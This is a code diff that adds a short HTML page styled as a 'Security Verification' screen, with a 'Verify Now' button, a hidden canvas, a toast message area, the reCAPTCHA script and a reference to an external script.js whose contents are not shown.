@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification</title>
+
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+  <style>
+    body{
+      text-align:center;
+      font-family:sans-serif;
+      margin-top:60px;
+      background:#0f172a;
+      color:white;
+    }
+
+    button{
+      padding:12px 25px;
+      font-size:16px;
+      border:none;
+      border-radius:8px;
+      background:#22c55e;
+      color:white;
+      cursor:pointer;
+    }
+
+    #toast{
+      position:fixed;
+      top:20px;
+      left:50%;
+      transform:translateX(-50%);
+      background:#111;
+      color:#fff;
+      padding:10px 20px;
+      border-radius:8px;
+      opacity:0;
+      transition:0.3s;
+    }
+  </style>
+</head>
+
+<body>
+
+<h2>🔐 Security Verification</h2>
+
+<button id="verifyBtn">Verify Now</button>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<div id="toast"></div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
